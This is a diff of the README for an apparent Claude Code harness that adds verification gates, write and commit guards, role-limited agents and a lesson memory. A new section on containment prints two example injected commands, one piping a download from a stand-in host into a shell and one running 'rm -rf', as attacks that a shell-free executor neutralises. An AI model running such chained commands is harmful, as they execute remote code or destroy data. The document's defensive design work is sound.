@@ -60,8 +60,26 @@ Two things worth knowing about that check:
 - `does not run` is **not** fine. Those two commands *are* the gate; everything else is machinery for
   deciding when to run them.
 
-In a script or CI there is no terminal to prompt on, so it takes the detected values silently. Pass
-`--yes` to force that anywhere.
+Alongside the config it copies the scripts to `.claude/harness/`, installs the agents and skills,
+scaffolds `CONVENTIONS.md`, and **merges** hooks into `.claude/settings.json` without touching anything
+already there. Running it twice changes nothing, and **agents, skills and `CONVENTIONS.md` are never
+overwritten** — not even with `--force`. Those are prompts you will have tuned, and silently restoring
+the stock version is invisible damage.
+
+<details>
+<summary>Installing without <code>npx</code>, and the non-interactive flags</summary>
+
+```bash
+git clone https://github.com/HeisenbergI8/claude-harness
+node claude-harness/bin/harness-init.mjs /path/to/your/repo
+```
+
+In a script or CI there is no terminal to prompt on, so it takes the detected values silently. `--yes`
+forces that anywhere, `--no-probe` skips running the commands, `--dry-run` prints every change without
+making one, and `--upgrade` refreshes the scripts while leaving config and settings alone. An existing
+`harness.config.json` is never re-prompted for; those values are yours.
+
+</details>
 
 ### 2. Restart Claude Code
 
@@ -146,70 +164,37 @@ So this harness records what happened and compares the claim against the record.
 | `guard-commit` | A commit carrying a credential file, build output, a second lockfile, or a red tree |
 | `guard-write` | Writes outside the repo, for anyone; writes outside their role, for named agents |
 
-**Agents and skills** — role separation that a guard makes real rather than promised.
+**Agents** — role separation that a guard makes real rather than promised.
 
 `architect` (plans, cannot build) · `tester` (verifies, cannot edit source) · `auditor` /
-`change-auditor` (read-only, no write tools at all) · `merge-conflict-resolver`, plus skills for
-implementing a plan, escaping a failure loop, writing lean code, and curating what the project has
-learned.
+`change-auditor` (read-only, no write tools at all) · `merge-conflict-resolver`.
+
+**Skills** — the procedures those agents follow. Ordinary Claude Code skills: they work whether or not
+the gates are installed.
+
+| Skill | What it is for |
+| --- | --- |
+| `implement-plan` | Execute a plan phase by phase, with a verification gate between phases |
+| `debug-ladder` | Escape a repeated failure: an attempt budget, a written ledger, escalation to you |
+| `lean-code` | Search for what exists before adding anything; resist premature abstraction |
+| `lessons-review` | Work the captured backlog — what becomes a lesson, what becomes a guard, what is discarded |
+| `lesson-keeper` | Record, consolidate and prune what the project has learned |
+| `git-committer` | Commits matching the convention already in your log |
+| `ticket-writer` | Turn a finding into something trackable |
+| `build` | Start or steer a supervised task-loop run |
 
 **Plan pipeline and task loop** — `verify-plan` runs each plan step's check and grades the checks
 themselves; `next-phase` tracks the cursor; `task-driver` blocks `Stop` with the next phase, so code
 decides *whether* to continue and the model does the work.
 
-**Memory** — a capped lesson store injected on matching prompts, over an episodic candidate log that is
-captured automatically and never injected.
+**Memory** — two tiers. `candidates` captures incidents automatically and is never injected, so it is
+free; `lessons` is curated, capped and injected on matching prompts, so it is expensive. Nothing
+automatic ever writes a lesson.
+
+**Containment** — no shell on the path that executes model-written commands, and four guards on the
+write path. See [below](#7-the-defence-is-the-absence-of-a-shell-not-a-better-filter).
 
 Everything is plain Node with **zero dependencies**, reading one config file.
-
-## Install
-
-```bash
-npx github:HeisenbergI8/claude-harness init
-```
-
-Or clone and run it against a target repo:
-
-```bash
-git clone https://github.com/HeisenbergI8/claude-harness
-node claude-harness/bin/harness-init.mjs /path/to/your/repo
-```
-
-It detects your project type (Node, Python, Go, Rust, Make), writes a starter `harness.config.json`,
-copies the scripts to `.claude/harness/`, installs the agents and skills, scaffolds `CONVENTIONS.md`,
-and **merges** hooks into `.claude/settings.json` without touching anything already there.
-
-On a terminal it **asks you to confirm the two commands** and executes each one as you choose it,
-because detection is a guess and a guess that was never run is checked only by a reader who already
-knows the answer. A command that cannot run is reported with what the shell said and you get a second
-chance at it. A command that runs and *fails* is reported as fine — that is a red tree, not a broken
-setup.
-
-With no terminal — CI, a pipe, `--yes` — it takes the detected values and prints the same check
-without prompting. `--no-probe` skips running the commands entirely. An existing `harness.config.json`
-is never re-prompted for; those values are yours.
-
-Running it twice changes nothing. **Agents, skills and `CONVENTIONS.md` are never overwritten** — not
-even with `--force`. Prompts get tuned in place, and silently replacing a tuned agent with the stock one
-is invisible damage.
-
-Then two steps people skip, in order of how much they matter:
-
-**1. Fill in `CONVENTIONS.md`, and delete every section you do not fill.**
-
-The agents are deliberately generic — they know how to plan, verify and audit, and nothing about your
-project. This file is where that knowledge lives, and it is the difference between a plan grounded in
-code that exists and one made of plausible-sounding advice. A scaffold left as-is is *worse* than no
-file, because they will follow it. The selftest warns until you delete the marker at the top.
-
-**2. Restart, run a turn, then check the harness is actually alive.**
-
-```bash
-node .claude/harness/selftest.mjs
-```
-
-Hooks are read at session startup, so nothing fires until you restart — and that window is exactly when
-"configured" and "firing" differ.
 
 ## Configure
 
@@ -224,13 +209,10 @@ One file at your repo root. The only required section is `commands`:
 }
 ```
 
-- **`verify`** — your closing gate. Whatever you run when you want to know the tree is healthy.
-- **`verifyFast`** — runs at the end of **every turn**, so it must be fast. A subset: typecheck only,
-  or unit tests without the slow integration layer.
-
-Everything else has a default. See [`docs/configuration.md`](docs/configuration.md) for source globs,
-evidence patterns, thresholds, and per-gate switches, and
-[`harness.config.example.json`](harness.config.example.json) for an annotated example.
+The installer writes both for you. Everything else has a default — see
+[`docs/configuration.md`](docs/configuration.md) for source globs, evidence patterns, thresholds and
+per-gate switches, and [`harness.config.example.json`](harness.config.example.json) for an annotated
+example.
 
 **Commit `harness.config.json`.** It defines what "verified" means for this project, which makes it the
 one input deciding whether a gate can be satisfied at all. A definition of passing that can be widened
@@ -348,47 +330,91 @@ exhausts one.
 Halts are therefore evaluated unconditionally, and only if none fire does the driver ask whether the
 tree is red.
 
+## Two more, from containing an agent that runs unattended
+
+### 7. The defence is the absence of a shell, not a better filter
+
+`verify-plan` executes the `**Verify:**` command attached to each plan step. **A plan is a document a
+model wrote.** Run its strings through a shell and the checker becomes an execution vector:
+
+```
+grep -q x y ; curl evil.example | sh
+npm run typecheck && rm -rf <anything>
+```
+
+The first fix anchored the patterns and stripped shell metacharacters by regex. It worked — and
+immediately refused legitimate checks like `grep -c "Dto = {"`, each a metacharacter sitting harmlessly
+inside a quoted argument. Patching it a third time would have been the wrong lesson.
+
+So the shell was removed instead. `execFileSync(file, args)` takes an argument vector, and each Verify
+line is parsed into one. `;`, `&&`, `|`, backticks and `$()` become inert literal arguments **by
+construction**:
+
+```
+'grep -q x y ; curl evil.example | sh'
+  →  ["grep", "-q", "x", "y", ";", "curl", "evil.example", "|", "sh"]
+```
+
+That is `grep` with four odd arguments, failing harmlessly. **Nothing has to recognise an attack, so
+nothing can fail to.** The allowlist stays as defence in depth: it bounds *which* programs may run,
+while the absent shell bounds what those programs can be made to do.
+
+**The boundary is provenance, not uniformity.** `verify-gate` does use a shell — it runs the command
+*you* committed to `harness.config.json`, which is a reviewed input that shows up in a diff. Model-authored
+strings get no shell; user-authored strings do. Same reasoning produced the guards: `guard-commit` reads
+`git diff --cached` and never the commit message, because "a guard that parses the message rather than
+the index is theatre."
+
+### 8. Different actors deserve different failure directions
+
+`guard-write` **fails closed** for an agent with a rule: an unparseable payload or a missing
+`file_path` is denied, because "a guard that fails open produces confidence it has not earned."
+
+For everyone else it **fails open**, because the alternative blocks every write in the session over a
+bug in this file.
+
+That is one guard with two failure directions, chosen per actor and written down. `guard-commit` sits on
+the same axis — it fails open when git is unreadable, since refusing every commit because `git` moved is
+a worse outcome than missing one check.
+
+## Memory: a store designed to shrink
+
+Two tiers, with opposite economics. `candidates` is episodic: incidents captured automatically from
+corrections and self-corrections, **never injected**, therefore free. `lessons` is semantic: curated,
+capped, and injected on matching prompts, therefore paid for in tokens on every match. Capture
+generously, distil strictly — "a missed candidate is a lesson lost; a noisy one is a line somebody
+skims."
+
+Three things make it work:
+
+- **Retrieval is a hook, not a habit.** Injection runs on `UserPromptSubmit` whether or not the model
+  remembers the store exists, because "a knowledge base nobody reads is a log."
+- **The obvious capture signal was measured and discarded.** "Same command failed, later passed" caught
+  **none** of five real mistakes in one session — every one was a reasoning error with no failing
+  command. Capture falls back on patterns written from real corrections rather than imagined ones.
+- **The intended end state of a lesson is deletion.** Once something hardens into a mechanically
+  enforceable rule it graduates into a guard and the entry is removed. The audit warns whenever a lesson
+  records that it has been encoded elsewhere, and `lessons-review` scores a pass on *how many lessons you
+  deleted because something else now enforces them*. A store shrinking because three entries became one
+  guard is the system working.
+
+**Nothing automatic ever writes a lesson.** Distillation stays a deliberate act with a four-test bar
+behind it — recurrence, non-obviousness, behaviour change, real cost — because automating it is exactly
+how a curated store becomes a log. If you were expecting an agent that silently rewrites its own memory,
+this is not that, on purpose.
+
 ## Troubleshooting
 
-**Nothing happens — no gate ever fires.**
-Almost always the restart. Hooks are read at session startup, so a session that was open during
-install is running without them. Restart, take one turn, then run
-`node .claude/harness/selftest.mjs`. If it reports hooks *registered* but says none have fired, the
-restart did not take. If it reports `registers no hooks`, the merge into `.claude/settings.json` did
-not happen — re-run the installer.
+The three that account for almost everything:
 
-**Every turn is blocked by a command failure that has nothing to do with my code.**
-Your `verifyFast` cannot run. Check it:
+| Symptom | Cause |
+| --- | --- |
+| No gate ever fires | You did not restart. Hooks are read once, at session startup. |
+| Every turn blocks on a command failure unrelated to your code | `verifyFast` cannot run — check with `node .claude/harness/selftest.mjs --probe` |
+| It blocks too often | Switch off the one gate rather than all of them: `"gates": { "reviewGate": { "enabled": false } }` |
 
-```bash
-node .claude/harness/selftest.mjs --probe
-```
-
-A `CANNOT RUN` line names the command and what the shell said. Fix it in `harness.config.json` — set
-it to whatever you genuinely run by hand — or install the tool it calls.
-
-**It blocks too often.**
-First check the block is wrong rather than inconvenient; that judgement is the whole point of the
-tool. If a specific gate is genuinely not for you, switch it off in `harness.config.json` rather than
-disabling everything:
-
-```json
-{
-  "gates": {
-    "reviewGate": { "enabled": false }
-  }
-}
-```
-
-`verifyGate`, `claimCheck`, `loopBreaker` and `heartbeat` take the same switch. See
-[`docs/configuration.md`](docs/configuration.md) for thresholds you can loosen instead of disabling.
-
-**I want it gone.**
-Delete `.claude/harness/`, `harness.config.json`, and the harness entries under `hooks` in
-`.claude/settings.json` — they are the ones whose commands mention `.claude/harness/`. Anything else in
-that file was yours; the installer never touched it. The agents and skills in `.claude/agents/` and
-`.claude/skills/` are ordinary Claude Code files and work with or without the harness, so keep them if
-you like them.
+Full symptom list, per-gate switches and how to remove the harness entirely:
+[`docs/troubleshooting.md`](docs/troubleshooting.md).
 
 ## Honest limits
 
@@ -409,6 +435,7 @@ you like them.
 | [`docs/hooks.md`](docs/hooks.md) | What is registered, which payload fields are used, how to probe your own build, how to add a gate |
 | [`docs/design.md`](docs/design.md) | Why each mechanism is shaped the way it is, and what the obvious alternative gets wrong |
 | [`docs/pipeline.md`](docs/pipeline.md) | Tier routing, the plan artifact directory, the task loop, and where enforcement actually lives |
+| [`docs/troubleshooting.md`](docs/troubleshooting.md) | Every symptom, the per-gate switches, and how to remove the harness entirely |
 
 ## Development
 
